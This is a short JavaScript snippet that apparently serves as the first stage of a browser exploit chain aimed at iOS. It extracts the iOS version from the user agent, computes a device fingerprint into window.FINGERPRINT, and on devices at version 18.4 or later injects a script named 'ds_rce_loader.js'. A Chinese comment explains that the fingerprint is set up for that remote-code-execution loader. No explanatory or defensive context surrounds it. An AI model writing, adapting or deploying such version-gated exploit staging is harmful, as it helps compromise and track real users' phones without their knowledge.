(function() {
  var ua = navigator.userAgent;

  function getIOSVersion() {
    function pad(s) { return s.length === 1 ? '0' + s : s; }
    var u = ua.match(/Version\/(\d+)\.(\d+)(?:\.(\d+))?/);
    if (!u && /^Mozilla\/5\.0 /.test(ua))
      u = ua.match(/iOS\/(\d+)\.(\d+)(?:\.(\d+))?/);
    if (!u && /iPhone OS \d+_\d+/.test(ua))
      u = ua.match(/iPhone OS (\d+)_(\d+)(?:_(\d+))?/);
    if (!u) return 0;
    return parseInt(pad(u[1]) + pad(u[2]) + (u[3] ? pad(u[3]) : '00'), 10);
  }

  var ver = getIOSVersion();

  // 内联设置指纹，确保 ds_rce_loader.js 加载前 window.FINGERPRINT 已就绪
  (function() {
    var hash = 0;
    var input = ua + '|' + (navigator.language||'') + '|' + screen.width + 'x' + screen.height;
    for (var i = 0; i < input.length; i++) { hash = ((hash << 5) - hash) + input.charCodeAt(i); hash |= 0; }
    var fp = Math.abs(hash).toString(16);
    while (fp.length < 64) { fp += Math.abs((hash * (fp.length + 1))).toString(16); }
    window.FINGERPRINT = fp.substring(0, 64);
  })();

  function loadScript(src) {
    var s = document.createElement('script');
    s.src = src + '?' + Date.now();
    document.head.appendChild(s);
  }

  if (ver >= 180400) {
    loadScript('ds_rce_loader.js');
  }
})();
